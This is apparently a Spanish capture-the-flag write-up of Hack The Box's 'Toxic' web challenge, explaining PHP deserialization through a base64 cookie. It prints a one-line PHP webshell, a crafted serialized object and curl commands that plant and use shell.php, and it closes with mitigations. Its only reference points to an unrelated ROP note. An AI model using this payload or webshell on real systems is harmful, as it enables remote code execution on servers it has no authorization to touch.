---
challenge: Toxic
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, php, deserialization, object-injection, magic-methods]
---


# Toxic — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

La aplicación guarda un objeto PHP **serializado en una cookie** y lo pasa por `unserialize` en cada petición. Una clase con un método mágico `__destruct` escribe un fichero cuyo nombre viene de una propiedad del objeto. Se inyecta un objeto con `logFile` apuntando a un `.php` del webroot y el `__destruct` deja un webshell.

## Enunciado y superficie

Un sitio con una página de inicio y una cookie de sesión que cambia según la visita. No hay login ni formulario: todo el estado viaja en la cookie.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```php
class Toxic {
    public $logFile;
    public function __destruct() {
        file_put_contents($this->logFile, "<?php system(\$_GET['c']); ?>");
    }
}

if (isset($_COOKIE['PHPSESSID'])) {
    $obj = unserialize(base64_decode($_COOKIE['PHPSESSID']));
}
```

Dos detalles clave:

1. No hay allowlist de clases: cualquier clase cargada se puede instanciar desde la cookie.
2. El nombre del fichero no se valida, así que apunta donde queramos dentro del webroot.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

Se construye el objeto con el mismo nombre de clase y la propiedad pública:

```php
O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}
```

Se codifica en base64 y se envía en la cookie:

```bash
PAYLOAD=$(printf 'O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<puerto>/
curl -s "http://<IP>:<puerto>/shell.php?c=id"
```

La primera petición destruye el objeto al terminar el script y escribe `shell.php`; la segunda ejecuta comandos.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con `c=cat /flag*` aparece la flag.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Longitud de la propiedad**: `s:7:"logFile"` cuenta exactamente los caracteres; un byte de más rompe la deserialización y la cookie se ignora en silencio.
- **Base64 con saltos de línea**: usar `-w0` para que la cookie no se corte.
- **Ruta del webroot**: si `/var/www/html` no es escribible, probar `uploads/` o un subdirectorio con permisos.

- `unserialize` sobre datos del cliente es ejecución de código a través de métodos mágicos, no solo lectura de datos.
- `__destruct`, `__wakeup` y `__toString` son los ganchos habituales de la inyección de objetos PHP.
- Mitigación: `json_decode` para estado del cliente, `allowed_classes => false` y nombres de fichero generados por el servidor.

## Mitigaciones y detección

- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.

## Referencias

- [rop-stack](../../knowledge/pwn/rop-stack.md)
